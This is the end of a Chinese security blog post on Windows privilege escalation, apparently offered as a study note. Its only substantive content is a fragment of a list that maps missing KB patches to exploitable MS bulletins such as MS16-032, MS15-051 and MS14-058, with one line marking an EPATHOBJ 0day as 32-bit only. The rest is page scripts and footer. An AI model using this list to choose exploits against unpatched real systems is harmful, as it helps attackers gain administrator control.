-pid<br>KB2124261|KB2271195 MS10-065 IIS7<br>KB970483|MS09-020IIS6<br>KB3139914|MS16-032<br>KB3124280|MS16-016<br>KB3134228|MS16-014<br>KB3079904|MS15-097<br>KB3077657|MS15-077<br>KB3045171|MS15-051<br>KB3000061|MS14-058<br>KB2829361|MS13-046<br>KB2850851|MS13-053EPATHOBJ 0day 限32位<br>KB2707511|MS12-042 sysret -pid<br>KB2124261|KB2271195 MS10-065 IIS7<br>KB970483|MS09-020IIS6</p>
    </div>
  </div>
  
    <div class="copy-right">
      <div class="markdown-body">
        <blockquote>
        
        
          本文作者 : JohnScott <br/>
        
        原文链接 : <a href="">https://github.com/liuxue5213/liuxue5213.github.io/2022/56%E6%8F%90%E6%9D%83/</a><br>
        版权声明 : 本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
        </blockquote>
      </div>
    </div>
  
  
  
    <div class="social-share"
  style="margin-top: -2rem"
  data-wechat-qrcode-title="<p>微信扫一扫</p>"
  data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>"
   data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter" 
  
>
  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
</div>
<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async>
  

  
    <div id="reward">
  
    <p id="reward-meta">知识 & 情怀 | 二者兼得</p>
  
  <button id="reward-btn">
    
    <span>感谢您的关心</span>
  </button>
  <div id="reward-qrcode">
    
      <div class="reward-qrcode--container">
        <img class="qrcode-img" src="/images/wechat.png" alt="微信扫一扫">
        <p class="qrcode-meta">微信扫一扫</p>
      </div>
    
      <div class="reward-qrcode--container">
        <img class="qrcode-img" src="/images/alipay.png" alt="支付宝扫一扫">
        <p class="qrcode-meta">支付宝扫一扫</p>
      </div>
    
  </div>

</div>

<script>
  (() => {
    let button = document.querySelector('#reward-btn'),
      qrcode = document.querySelector('#reward-qrcode'),
      display = false;
    
    button.addEventListener('click', () => {
      qrcode.style.display = display ? 'none' : 'block'
      display = !display
    }, false)
  })()
</script>
  

  <div class="article-footer">
    <div class="article-meta pull-left">
      <span>
        
          <i class="iconfont icon-06tags"></i>标签: 
          
          <span class="span--tag">
            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
              #网络安全
            </a>
          </span>
          
        
      </span>
    </div>
    <div class="article-meta pull-right">
    </div>
  </div>
</div>


  <aside id="sidebar">
    <p id="sidebar-header"></p>
    <ol id="sidebar-toc"></ol>
  </aside>
  <script async>setTimeout(generateToc, 10);</script>


  <nav class="post-navigation">
    
      <div class="nav-pre">
        <i class="iconfont icon-prev"></i>
        上一篇:
        <a href="/2022/53%E5%85%8D%E6%9D%80/" target="_self">53免杀</a>
      </div>
    
    
      <div class="nav-next">
        下一篇:
        <a href="/2022/55%E6%8F%90%E6%9D%83/" target="_self">55提权</a>
        <i class="iconfont icon-next"></i>
      </div>
    
  </nav>

  
    <a href="#comment" class="comment-anchor"></a>
<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
<div id="vcomments"></div>

<script defer>
  if( true ) {
    let path = getRealPath()
    new Valine({
      el: "#vcomments",
      appId: "E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz",
      appKey: "6VNHrdDAu0JKJXxyMajHk6qD",
      notify: false,
      verify: false,
      avatar: "robohash",
      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
      path
    });
  }
</script>
   

  
    <script defer>
const valineAPI = (() => {
  try {
    AV.init("E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz", "6VNHrdDAu0JKJXxyMajHk6qD");
  } catch(error) {}
  const isExist = (identity) => {
    identity = identity || getRealPath();
    let query = new AV.Query('Timer');
    return new Promise((resolve, reject) => {
      query.equalTo("identity", identity);
      query.find().then(results => {
        resolve(results.length > 0);
      }, error => reject(error));
    })
  }

  const _get = (identity) => {
    let query = null;
    if(identity && identity instanceof Array){
      let querys = [];
      for(let i = 0; i < identity.length; ++i) {
        querys[i] = new AV.Query('Timer');
        querys[i].equalTo('identity', identity[i]);
      }
      query = AV.Query.or.apply(null ,querys);
    } else {
      identity = identity || getRealPath();
      query = new AV.Query("Timer");
      query.equalTo("identity", identity);
    }

    return new Promise((resolve, reject) => {
      query.find()
      .then(results => resolve(results))
      .catch(error => reject(error))
    })
  }

  const create = (identity) => {
    identity = identity || getRealPath();
    return new Promise((resolve, reject) => {
      let Todo = AV.Object.extend('Timer');
      let todo = new Todo();
      todo.set("times", 1);
      todo.set("identity", identity);
      todo.save().then(res => resolve(true), error => reject(error));
    })
  }

  const update = (identity) => {
    identity = identity || getRealPath();
    return new Promise((resolve, reject) => {
      let query = new AV.Query('Timer');
      query.equalTo("identity", identity);
      query.find().then(todos => {
        todos.forEach(todo => {
          todo.set("times", todo.attributes.times + 1);
        });
        return AV.Object.saveAll(todos);
      }).then(todos => resolve(true), error => reject(error));
    })
  }

  return {
    isExist,
    _get,
    update,
    create
  }
})()

const calcAndWriteTimes = () => {
  let isPost = true;

  let timerAllDOM = document.querySelectorAll(".article-timer");

  if(isPost) {
    let identity = timerAllDOM[0].getAttribute("data-identity");
    valineAPI.isExist(identity)
    .then(exist => {
      if(exist) {
        return valineAPI.update(identity);
      }
      return new Promise(resolve => resolve(true));
    })
    .then( succuess => valineAPI._get(identity))
    .then( result => timerAllDOM[0].innerText = result[0].attributes.times)
    .catch(error => console.log(error.message))
    return ;
  }

  let timerDOMCache = {};

  for(let timerDOM of timerAllDOM) {
    let identity = timerDOM.getAttribute("data-identity");
    if(timerDOMCache.hasOwnProperty(identity)){
      timerDOMCache[identity].dom.push(timerDOM);
    }else{
      timerDOMCache[identity] = {
        dom: [timerDOM],
        times: undefined
      };
    }
  }

  let identities = Object.keys(timerDOMCache);
  valineAPI._get(identities).then(results => {
    for(let result of results) {
      let {identity, times} = result.attributes;
      timerDOMCache[identity].times = times;
      timerDOMCache[identity].dom.map(item => item.innerText = times);
    }
    for(let identity of identities) {
      if(timerDOMCache[identity].times){
        continue;
      }
      timerDOMCache[identity].dom.map(item => item.innerText = 1);
      valineAPI.create(identity);
    }
  }).catch(error => console.log(error.message))
}

if(true){
  calcAndWriteTimes();
}
</script>
   

</div>


      <footer>
  <p class="site-info">
    博客已萌萌哒运行<span id="time-to-now"></span><span class="my-face">(●'◡'●)ﾉ♥</span>
    <br>
    Theme - <a href="https://github.com/dongyuanxin/theme-bmw">BMW</a> | Made With 💗 | Powered by <a target="_blank" rel="noopener" href="https://godbmw.com/">GodBMW</a>
    <br>
    
  </p>
</footer>



<script>
const timeToNowDOM = document.querySelector("#time-to-now");
const startTimestamp = new Date(2015, 0, 1).getTime();

const updateTimeStr = () => {
  let offset = parseInt(
      (new Date().getTime() - startTimestamp) / 1000,
      10
    ),
    day = Math.floor(offset / 86400),
    hour = Math.floor((offset % 86400) / 3600),
    minute = Math.floor(((offset % 86400) % 3600) / 60),
    second = Math.floor(((offset % 86400) % 3600) % 60);
  timeToNowDOM.innerHTML =
    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
  setTimeout(updateTimeStr, 500);
}

setTimeout(updateTimeStr, 500);
</script>


      <div class="back-to-top hidden">
  <span>
    <i class="iconfont icon-60"></i><span></span>%
  </span>
</div>

<script>
const updateIconToTop = percent => {
  let dom = document.querySelector(".back-to-top span span");
  dom.innerText = percent;
  if(percent < 1) {
    document.querySelector(".back-to-top").className = "back-to-top hidden";
  } else {
    document.querySelector(".back-to-top").className = "back-to-top";
  }
}

const handleScoll = () => {
  let isRunning = false;
  return () => {
    if (isRunning) return;
    isRunning = true;
    window.requestAnimationFrame(timestamp => {
      let scrollTop =
          document.documentElement.scrollTop || document.body.scrollTop,
        scrollHeight =
          document.documentElement.scrollHeight ||
          document.body.scrollHeight,
        clientHeight =
          document.documentElement.clientHeight ||
          document.body.clientHeight;
      isRunning = false;
      if (scrollTop <= 1) {
        updateIconToTop(0);
        return;
      }
      if (scrollTop + clientHeight >= scrollHeight) {
        updateIconToTop(100);
      } else {
        updateIconToTop(parseInt(
          100 * scrollTop / (scrollHeight - clientHeight),
          10
        ));
      }
    });
  };
}

const backToTop = () => {
  let scrollTop =
      document.documentElement.scrollTop || document.body.scrollTop,
    delay = 10,
    time = 200;
  if (scrollTop <= 20) {
    document.documentElement.scrollTop = 0;
    document.body.scrollTop = 0;
    return;
  }
  let step = Math.ceil(scrollTop * delay / time);
  let timer = setInterval(() => {
    scrollTop =
      document.documentElement.scrollTop || document.body.scrollTop;
    if (scrollTop - step <= 0) {
      document.documentElement.scrollTop = 0;
      document.body.scrollTop = 0;
      clearInterval(timer);
    } else {
      document.documentElement.scrollTop = scrollTop - step;
      document.body.scrollTop = scrollTop - step;
    }
  }, delay);
}

document.addEventListener("scroll", handleScoll(), false);

document.querySelector(".back-to-top").addEventListener("click", backToTop, false);

</script>

    </div>

    
      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
<script>
  (() => {
    const mathjaxConfig = {
      showProcessingMessages: false, //关闭js加载过程信息
      messageStyle: "none", //不显示信息
      jax: ["input/TeX", "output/HTML-CSS"],
      tex2jax: {
        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
      },
      "HTML-CSS": {
        availableFonts: ["STIX", "TeX"], //可选字体
        showMathMenu: false //关闭右击菜单显示
      }
    }

    let mathjaxInterval = setInterval(() => {
      if(!window.MathJax){
        return;
      }
      window.MathJax.Hub.Config(mathjaxConfig)
      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])

      clearInterval(mathjaxInterval)
    }, 10)    
  })()
</script>
    

    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
<script async>
  let fancyTimer = setInterval(function(){
    if(!window.$){
      return;
    }
    $(document).ready(function() {
      $(".post img").each(function () {
        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
          return;
        }
        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "gallery");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      });
      
      clearInterval(fancyTimer);
    });
  }, 10);
</script>

    
  </body>

</html>
